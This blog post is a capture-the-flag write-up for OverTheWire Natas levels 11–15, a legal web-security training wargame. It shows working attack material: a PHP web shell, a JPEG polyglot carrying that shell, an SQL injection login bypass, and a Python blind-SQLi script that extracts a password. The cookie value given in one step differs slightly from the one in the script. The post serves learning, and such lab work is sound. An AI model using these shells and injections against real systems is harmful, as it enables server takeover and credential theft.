---
layout: post
title: "OverTheWire - Natas Solutions 11 - 15"
date: 2025-04-27 12:00:00 +0200
categories: [CTF, OverTheWire, Natas, Web, Encryption, XOR, Known-Plaintext-Attack, SQLi]
tags: [CTF, writeup, web-security, natas]
description: "Solutions and walkthroughs for OverTheWire Natas levels 11–15, focusing on encryption, XOR, known-plaintext attack, and SQL injection."
image:
  path: /assets/img/overthewire/OverTheWire.png
  alt: "Natas level screenshots"
toc: true
mermaid: false
math: false
comments: false
---

# Natas Solutions

This page contains my solutions for the Natas wargame challenges 11 - 15 from OverTheWire.

## Overview
Natas teaches the basics of serverside web-security. Each level contains its own website that requires you to find a vulnerability to gain access to the next level.

## Solutions

### Level 11 --> Level 12
**URL**: http://natas11.natas.labs.overthewire.org  
**Username**: natas11  
**Password**: [REDACTED]

#### Solution

1. I visited the URL and logged in with the provided credentials. The page indicated that cookies are protected with XOR encryption.
   ![Welcome](/assets/img/overthewire/natas11_15/natas11_1.png)
2. I inspected the cookies and there was `Data` with the value `HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D`.
3. By viewing the source code, I understood how the cookie is processed:
   ```php
   <?
   $defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");

   function xor_encrypt($in) {
       $key = '<censored>';
       $text = $in;
       $outText = '';

       for($i=0;$i<strlen($text);$i++) {
           $outText .= $text[$i] ^ $key[$i % strlen($key)];
       }

       return $outText;
   }

   function loadData($def) {
       global $_COOKIE;
       $mydata = $def;
       if(array_key_exists("data", $_COOKIE)) {
           $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
           if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
               if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
                   $mydata['showpassword'] = $tempdata['showpassword'];
                   $mydata['bgcolor'] = $tempdata['bgcolor'];
               }
           }
       }
       return $mydata;
   }

   function saveData($d) {
       setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
   }

   $data = loadData($defaultdata);

   if(array_key_exists("bgcolor",$_REQUEST)) {
       if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
           $data['bgcolor'] = $_REQUEST['bgcolor'];
       }
   }

   saveData($data);
   ?>
   ```
4. The cookie data is JSON-encoded, XOR-encrypted with a static key, and then base64-encoded. To decrypt it, I needed to reverse these steps.
5. I performed a known-plaintext attack using the expected JSON structure `{"showpassword":"no","bgcolor":"#ffffff"}` to deduce the XOR key. This attack works because XOR encryption is reversible if you know part of the plaintext and have the ciphertext. By XORing the known plaintext with the ciphertext, I could recover the key or its repeating pattern.
   ```ini
   Ciphertext = Plaintext ⊕ Key
   Key = Plaintext ⊕ Ciphertext
   ```
6. I used the following Python script to determine the key from the repeating pattern:

   ```python
   import base64

   cookie_value = 'HmYkBwozJw4WNyAAFyB1VUcq0E1JZjUIBis7ABdmbU1GJjEJASBjTRg%3D'
   cookie_value = cookie_value.replace('%3D', '=')  # Handle URL encoding

   ciphertext = base64.b64decode(cookie_value)
   plaintext = '{"showpassword":"no","bgcolor":"#ffffff"}'

   key_stream = []
   for i in range(len(plaintext)):
       key_stream.append(chr(ciphertext[i] ^ ord(plaintext[i])))

   key_guess = ''.join(key_stream)
   print(f"Key Stream: {key_guess}")
   ```
7. Once I obtained the key, I created a new cookie value with `{"showpassword":"yes","bgcolor":"#ffffff"}`:

   ```python
   import base64

   def xor_encrypt(data, key):
       out = ''
       for i in range(len(data)):
           out += chr(ord(data[i]) ^ ord(key[i % len(key)]))
       return out

   key = 'eDWo'
   plaintext = '{"showpassword":"yes","bgcolor":"#ffffff"}'
   encrypted = xor_encrypt(plaintext, key)
   cookie_value = base64.b64encode(encrypted.encode()).decode()

   print(cookie_value)
   ```
8. I set the new cookie value in my browser and reloaded the page, which revealed the password for natas12.
   ![Goodbye :)](/assets/img/overthewire/natas11_15/natas11_2.png)
**Password for Level 12**: [REDACTED]

---

### Level 12 --> Level 13
**URL**: http://natas12.natas.labs.overthewire.org  
**Username**: natas12  
**Password**: [REDACTED]

#### Solution

1. Upon accessing the natas12 page, I noticed an option to upload a file, hinting at a potential Remote Code Execution (RCE) challenge.
   ![RCE Maybe?](/assets/img/overthewire/natas11_15/natas12_1.png)
2. I attempted to upload a simple PHP web shell to execute commands:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
3. However, the uploaded file was automatically converted to a `.jpg` extension, which was not desirable for executing PHP code ;).
   ![Why JPG!](/assets/img/overthewire/natas11_15/natas12_2.png)
4. I examined the source code to understand the file handling process:
   ```php
   <?php

   function genRandomString() {
       $length = 10;
       $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
       $string = "";

       for ($p = 0; $p < $length; $p++) {
           $string .= $characters[mt_rand(0, strlen($characters)-1)];
       }

       return $string;
   }

   function makeRandomPath($dir, $ext) {
       do {
       $path = $dir."/".genRandomString().".".$ext;
       } while(file_exists($path));
       return $path;
   }

   function makeRandomPathFromFilename($dir, $fn) {
       $ext = pathinfo($fn, PATHINFO_EXTENSION);
       return makeRandomPath($dir, $ext);
   }

   if(array_key_exists("filename", $_POST)) {
       $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

       if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
           echo "File is too big";
       } else {
           if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
               echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
           } else {
               echo "There was an error uploading the file, please try again!";
           }
       }
   } else {
   ?>
   ```
5. The code revealed that the file name and path were randomized, but the extension was determined by the POST request. This allowed me to intercept the request and change the `.jpg` extension back to `.php`.
   ![PHP](/assets/img/overthewire/natas11_15/natas12_3.png)
6. After successfully uploading the PHP file, I crafted a malicious request to test the web shell, confirming the RCE vulnerability. And there I got the password for the next Level!
   ![Pwned](/assets/img/overthewire/natas11_15/natas12_4.png)

**Password for Level 13**: [REDACTED]

---

## Level 13 --> Level 14
**URL**: http://natas13.natas.labs.overthewire.org  
**Username**: natas13 
**Password**: [REDACTED]

#### Solution

1. Upon accessing the Natas13 challenge, I was greeted with a message indicating that only image files are accepted for upload. Attempting to upload a non-image file resulted in the error message: `File is not an image`.
   ![Not a PNG File](/assets/img/overthewire/natas11_15/natas13_1.png)

2. I examined the source code to understand the file validation process:
   ```php
   <?php

   function genRandomString() {
       $length = 10;
       $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
       $string = "";

       for ($p = 0; $p < $length; $p++) {
           $string .= $characters[mt_rand(0, strlen($characters)-1)];
       }

       return $string;
   }

   function makeRandomPath($dir, $ext) {
       do {
       $path = $dir."/".genRandomString().".".$ext;
       } while(file_exists($path));
       return $path;
   }

   function makeRandomPathFromFilename($dir, $fn) {
       $ext = pathinfo($fn, PATHINFO_EXTENSION);
       return makeRandomPath($dir, $ext);
   }

   if(array_key_exists("filename", $_POST)) {
       $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

       $err=$_FILES['uploadedfile']['error'];
       if($err){
           if($err === 2){
               echo "The uploaded file exceeds MAX_FILE_SIZE";
           } else{
               echo "Something went wrong :/";
           }
       } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
           echo "File is too big";
       } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
           echo "File is not an image";
       } else {
           if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
               echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
           } else{
               echo "There was an error uploading the file, please try again!";
           }
       }
   } else {
   ?>
   ```

3. The `exif_imagetype()` function is used to verify if the uploaded file is an image by checking its magic bytes. Magic bytes are specific sequences of bytes at the beginning of a file that indicate its format. This function does not consider the file extension, which can be exploited.

4. To bypass this check, I created a polyglot JPEG file. A polyglot file is a file that is valid in more than one format. I took a small JPEG image and appended PHP code to it:
   ```bash
   echo "<?php system(\$_GET['cmd']); ?>" >> natas13_HiddenCodeInside.jpg
   ```
   ![Payload](/assets/img/overthewire/natas11_15/natas13_2.png)

5. After uploading the modified JPEG file, I intercepted the request and changed the file extension from `.jpg` to `.php`. This allowed the server to execute the PHP code embedded in the image.
   ![Upload](/assets/img/overthewire/natas11_15/natas13_3.png)

6. By accessing the uploaded file with a command parameter, I successfully executed commands on the server, confirming the RCE vulnerability. With this I got the next Password!! 
   ![Pwned](/assets/img/overthewire/natas11_15/natas13_4.png)

**Password for Level 14**: [REDACTED]

---


### Level 14 --> Level 15
**URL**: http://natas14.natas.labs.overthewire.org  
**Username**: natas14  
**Password**: [REDACTED]

#### Solution

1. Upon accessing the webpage, I encountered a user login form and a button to view the source code.
   ![Login](/assets/img/overthewire/natas11_15/natas14_1.png)

2. Reviewing the source code revealed that user inputs were not sanitized, and prepared statements were not utilized, making the application vulnerable to SQL Injection (SQLi).

   ```php
   <?php
   if(array_key_exists("username", $_REQUEST)) {
       $link = mysqli_connect('localhost', 'natas14', '<censored>');
       mysqli_select_db($link, 'natas14');

       $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
       if(array_key_exists("debug", $_GET)) {
           echo "Executing query: $query<br>";
       }

       if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
               echo "Successful login! The password for natas15 is <censored><br>";
       } else {
               echo "Access denied!<br>";
       }
       mysqli_close($link);
   } else {
   ?>
   ```

3. Knowing the existing usernames, I crafted an SQLi payload: `localhost" OR 1=1 #`. This payload exploits the lack of input sanitization to bypass authentication. I used URL-Encoding so I was able to send the GET-Request in BurpSuite ;).

4. Executing the payload successfully logged me in and revealed the password for the next level.
   ![Pwned](/assets/img/overthewire/natas11_15/natas14_2.png)

**Password for Level 15**: [REDACTED]

---

### Level 15 --> Level 16
**URL**: http://natas15.natas.labs.overthewire.org  
**Username**: natas15  
**Password**: [REDACTED]

#### Solution

1. Upon accessing the natas15 page, I was presented with a form to check if a user exists.
   ![User Exist Window](/assets/img/overthewire/natas11_15/natas15_2.png)

2. I attempted a SQL injection (SQLi) attack to test the system's response. The application returned "This user exists." for certain inputs and "Error in query." for others.
   ![This user Exists](/assets/img/overthewire/natas11_15/natas15_3.png)
   ![Error in Query](/assets/img/overthewire/natas11_15/natas15_4.png)

3. By examining the source code, I identified a vulnerability that allowed for a Blind SQL Injection attack. Blind SQLi is a type of SQL injection where the attacker can infer information from the database based on the application's response, even though the actual data is not directly visible. This is possible because the application provides different responses based on whether a query returns results or not.

   ```php
   <?php

   /*
   CREATE TABLE `users` (
     `username` varchar(64) DEFAULT NULL,
     `password` varchar(64) DEFAULT NULL
   );
   */

   if(array_key_exists("username", $_REQUEST)) {
       $link = mysqli_connect('localhost', 'natas15', '<censored>');
       mysqli_select_db($link, 'natas15');

       $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
       if(array_key_exists("debug", $_GET)) {
           echo "Executing query: $query<br>";
       }

       $res = mysqli_query($link, $query);
       if($res) {
           if(mysqli_num_rows($res) > 0) {
               echo "This user exists.<br>";
           } else {
               echo "This user doesn't exist.<br>";
           }
       } else {
           echo "Error in query.<br>";
       }

       mysqli_close($link);
   } else {
   ?>
   ```

4. The code above shows that the application checks if a user exists by evaluating `mysqli_num_rows($res) > 0`. This behavior can be exploited to perform a Blind SQLi attack, as the application provides different responses based on the query result.

5. I developed a Python script to automate the extraction of the password using a binary search technique through Blind SQLi. The script iteratively guesses each character of the password by sending payloads that check if the ASCII value of a character is greater than a certain value. 
   
   > **_NOTE:_**
   > Using binary search, the correct ASCII character is identified in approximately 6-7 requests per character, as log₂(95) rounds to this range.
   > Overall, this method requires around 200 requests, significantly reducing the number from over 2,000 needed for a brute-force approach.

   ```python
   import requests
   import string
   import time

   url = "http://natas15.natas.labs.overthewire.org/index.php"
   auth = ("natas15", "REDACTED") 
   headers = {
       "Content-Type": "application/x-www-form-urlencoded",
       "User-Agent": "Mozilla/5.0",
   }

   min_ascii = 32
   max_ascii = 126

   def extract_password():
       known = ""
       for pos in range(1, 33):  # other passwords were 32 chars long
           low, high = min_ascii, max_ascii
           print(f"[ ] Position {pos}: ", end='', flush=True)

           while low <= high:
               mid = (low + high) // 2
               payload = f'natas16" AND ASCII(SUBSTRING(password,{pos},1)) > {mid} #'
               data = {"username": payload}
               r = requests.post(url, auth=auth, headers=headers, data=data)

               if "This user exists." in r.text:
                   low = mid + 1
               else:
                   high = mid - 1

           found_char = chr(low)
           known += found_char
           print(f"{found_char} => {known}")
       return known

   if __name__ == "__main__":
       print("[*] Extracting password using binary SQLi...")
       password = extract_password()
       print(f"\n[+] Final password: {password}")
   ```

6. Running the script revealed the password for the next level by determining each characters position and value. Pretty cool challenge :).
   ![Terminal Log](/assets/img/overthewire/natas11_15/natas15_1.png)
   
   ![Pwned](/assets/img/overthewire/natas11_15/natas15_5.png)

---
